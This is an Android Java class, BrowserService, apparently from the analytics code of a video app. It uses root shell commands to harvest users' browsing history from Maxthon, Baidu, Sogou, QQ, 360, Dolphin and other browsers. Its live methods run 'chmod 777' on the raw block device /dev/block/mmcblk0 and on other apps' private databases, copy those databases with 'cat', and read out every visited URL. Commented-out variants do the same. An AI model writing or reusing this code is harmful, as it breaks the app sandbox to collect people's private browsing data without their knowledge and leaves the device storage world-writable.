package tv.pps.bi.proto.biz;


import java.util.ArrayList;

import tv.pps.bi.utils.Utils;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.Browser;
import android.widget.Toast;

public class BrowserService {

	
//	public List<URLActivity> getFirefoxBrowserURL()//获取火狐数据库信息
//	{
//		String[] cmdStr = new String[1];
//		String chmod ="chmod 777 /data/data/org.mozilla.firefox/files/mozilla";
//		cmdStr[0] = chmod;
//		RootUtils.executeShell(cmdStr);
//		FileUtils.refreshFileList("/data/data/org.mozilla.firefox/files/mozilla");
//        String filePath = FileUtils.getFilelist().get(0);
//		if(filePath!=null)
//		{
//			Log.i("jiangqq", "存储数据库的的文件夹的路径为："+filePath);
//			//进行修改数据库
//			String  db_chmod="chmod 777 "+filePath+"/browser.db";
//            String  db_cat="cat "+filePath+"/browser.db"+" > /data/data/org.mozilla.firefox/pps_browser.db";
//            String  db_mv="mv /data/data/org.mozilla.firefox/pps_browser.db /data/data/com.pps.bi.activity/databases/pps_browser.db";
//            Log.i("jiangqq", "路径为:"+db_chmod);
//            Log.i("jiangqq", "路径为:"+db_cat);
//            Log.i("jiangqq", "路径为:"+db_mv);
//            String[] dbcmd=new String[3];
//            dbcmd[0]=db_chmod;
//            dbcmd[1]=db_cat;
//            dbcmd[2]=db_mv;
//            return extracted(dbcmd,"pps_browser.db","history");
//		}
//		return null;
//	}
	
	

	public ArrayList<String> getAoyouBrowserData(Context context) {// 获取遨游浏览器数据
		String thirdpartyDBName = "mxbrowser_default.db";
		String thirdpartyDBPath = "/data/data/com.mx.browser/databases/mxbrowser_default.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/mxbrowser_default.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	
	
	/**
	 * 获取百度浏览器的访问的历史记录(BaiDu)
	 * 
	 * @return 返回历史记录的集合
	 */
//	public List<URLActivity> getBaiduBrowserURL(Context context) {
//		String chmod = "chmod 777 /data/data/com.baidu.browser.apps/databases/dbbrowser.db";
//		String cat_cmd = "cat /data/data/com.baidu.browser.apps/databases/dbbrowser.db > /data/data/com.baidu.browser.apps/databases/pps_dbbrowser.db";
//		String mv_cmd = "mv /data/data/com.baidu.browser.apps/databases/pps_dbbrowser.db /data/data/com.pps.bi.activity/databases/pps_dbbrowser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cat_cmd;
//		cmdStr[2] = mv_cmd;
//		return extracted(cmdStr,"pps_dbbrowser.db","history",context);
//	}

	public ArrayList<String> getBaiduBrowserData(Context context) {// 获取百度浏览器数据
		String thirdpartyDBName = "dbbrowser.db";
		String thirdpartyDBPath = "/data/data/com.baidu.browser.apps/databases/dbbrowser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/dbbrowser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	/**
	 * 查询搜狗浏览器的访问记录
	 * @return
	 */
	public ArrayList<String> getSoGouBrowserData(Context context) {// 获取搜狗浏览器数据
		String thirdpartyDBName = "sogou_mobile_browser.db";
		String thirdpartyDBPath = "/data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/sogou_mobile_browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
//	public List<URLActivity> getSoGouBrowserURL(Context context) {
//		String chmod = "chmod 777 /data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db";
//		String cmd = "cat /data/data/sogou.mobile.explorer/databases/sogou_mobile_browser.db > /data/data/sogou.mobile.explorer/databases/pps_sogou_mobile_browser.db";
//		String mv_Cmd = "mv /data/data/sogou.mobile.explorer/databases/pps_sogou_mobile_browser.db /data/data/com.pps.bi.activity/databases/pps_sogou_mobile_browser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cmd;
//		cmdStr[2] = mv_Cmd;
//		return extracted(cmdStr,"pps_sogou_mobile_browser.db","history",context);
//	}
    
	
	/**
	 * 查询天天浏览器的历史访问记录
	 * @return
	 */
	public ArrayList<String> getSkyBrowserData(Context context) {// 获取天天浏览器数据
		String thirdpartyDBName = "HWBrowser.db";
		String thirdpartyDBPath = "/data/data/com.tiantianmini.android.browser/databases/HWBrowser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/HWBrowser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("TB_History", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
//	public List<URLActivity> getSkyBrowserURL(Context context)
//	{
//		String chmod = "chmod 777 /data/data/com.tiantianmini.android.browser/databases/HWBrowser.db";
//		String cmd = "cat /data/data/com.tiantianmini.android.browser/databases/HWBrowser.db > /data/data/com.tiantianmini.android.browser/databases/pps_HWBrowser.db";
//		String mv_Cmd = "mv /data/data/com.tiantianmini.android.browser/databases/pps_HWBrowser.db /data/data/com.pps.bi.activity/databases/pps_HWBrowser.db";
//		String[] cmdStr = new String[3];
//		cmdStr[0] = chmod;
//		cmdStr[1] = cmd;
//		cmdStr[2] = mv_Cmd;
//		return extracted(cmdStr,"pps_HWBrowser.db","TB_History",context);
//	}
//
//	/**
//	 * 查询火狐浏览器的历史访问记录
//	 * @return
//	 */
//	public List<URLActivity> getFirefoxBrowserURL()
//	{
//		
//		return null;
//	}
	
//	/**
//	 * 获取历史访问记录
//	 * @param cmdStr
//	 * @return
//	 */
//	private List<URLActivity> extracted(String[] cmdStr,String datebaseName ,String tableName,Context mContext) {
//		Utils.executeShell(cmdStr);
//		SQLiteDatabase mDatabase = mContext.openOrCreateDatabase(
//				datebaseName, 0, null);
//		Cursor mCursor = mDatabase.query(tableName, new String[] { "title",
//				"url" }, null, null, null, null, null);
//		if (mCursor != null && mCursor.getCount() >= 0) {
//			List<URLActivity> mUrlActivities = new ArrayList<URLActivity>(
//					mCursor.getCount());
//			while (mCursor.moveToNext()) {
//				URLActivity urlActivity = new URLActivity();
//				urlActivity.setTitle(mCursor.getString(mCursor
//						.getColumnIndex("title")));
//				urlActivity.setUrl(mCursor.getString(mCursor
//						.getColumnIndex("url")));
//				mUrlActivities.add(urlActivity);
//			}
//			if (mCursor != null) {
//				mCursor.close();
//			}
//			if (mDatabase != null) {
//				mDatabase.close();
//			}
//			return mUrlActivities;
//		}
//		return null;
//	}
	
	

	public ArrayList<String> getDolphinData(Context context) {// 获取海豚浏览器数据
		String thirdpartyDBName = "browser.db";
		String thirdpartyDBPath = "/data/data/com.dolphin.browser.xf/databases/browser.db";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
		}
		else{
			return null;
		}
	}
	
	public ArrayList<String> getQQData(Context context) {// 获取QQ浏览器数据
		String thirdpartyDBName = "database";
		String thirdpartyDBPath = "/data/data/com.tencent.mtt/databases/database";
		if( getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath)){
		
		String databaseFilename = context.getFilesDir() + "/database";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("URL")));
		}
		return list;
		}
		else{
			return null;
		}
		
	}
	
	
	
	public boolean getQihooRoot(Context context) {// 获取360浏览器数据库权限
		String thirdpartyDBName = "browser.db";
		String thirdpartyDBPath = "/data/data/com.qihoo.browser/databases/browser.db";
		return getVideoPackageRoot(context, thirdpartyDBName, thirdpartyDBPath);
	}
	public ArrayList<String> getQihooData(Context context) {// 获取360浏览器数据
		String databaseFilename = context.getFilesDir() + "/browser.db";
		ArrayList<String> list = new ArrayList<String>();
		SQLiteDatabase db = Utils.openDatabase(context, databaseFilename);
		Cursor c = db.query("history", null, null, null, null, null, null);
		while (c.moveToNext()) {
			list.add(c.getString(c.getColumnIndex("url")));
		}
		return list;
	}

	public boolean getVideoPackageRoot(Context context,
			String thirdpartyDBName, String thirdpartyDBPath) {
		// 修改数据库在自己包下的名字
		String dbname = thirdpartyDBName;
		String rootCmd = "chmod 777 /dev/block/mmcblk0";// 申请root权限
		String fromDB = thirdpartyDBPath;
		String toMyDB = context.getFilesDir().toString() + "/" + thirdpartyDBName;
		String modifyCmd = "chmod 777 " + fromDB;
		String copyCmd = "cat " + fromDB + "  > " + toMyDB;
		if (Utils.execRootCmd(rootCmd)) {
			Toast.makeText(context, "root成功", 1).show();
			if (Utils.execRootCmd(modifyCmd)) {
				Toast.makeText(context, "修改" + dbname + "读写权限成功", 1).show();
				if (Utils.execRootCmd(copyCmd))
					Toast.makeText(context,
							"复制" + dbname + "到" + toMyDB + "成功", 1).show();
				else {
					Toast.makeText(context,
							"复制" + dbname + "到" + toMyDB + "失败", 1).show();
					return false;
					
				}
			} else {
				Toast.makeText(context, "修改" + dbname + "读写权限失败", 1).show();
				return false;
			}
		} else {
			Toast.makeText(context, "root失败", 1).show();
			return false;
		}
		return true;
	}
	
	
	

	public ArrayList<String> getSystemBrowserUrl(Context context) {//获取系统浏览器的URL
		ContentResolver resolver = context.getContentResolver();
		ArrayList<String> list = new ArrayList<String>();
		Cursor cursor = null;
		try {
			cursor = Browser.getAllVisitedUrls(resolver);
			while (cursor.moveToNext()) {
				list.add(cursor.getString(cursor
						.getColumnIndex(Browser.BookmarkColumns.URL)));
			}
		} catch (Exception e) {
                   e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}
		return list;

	}

}
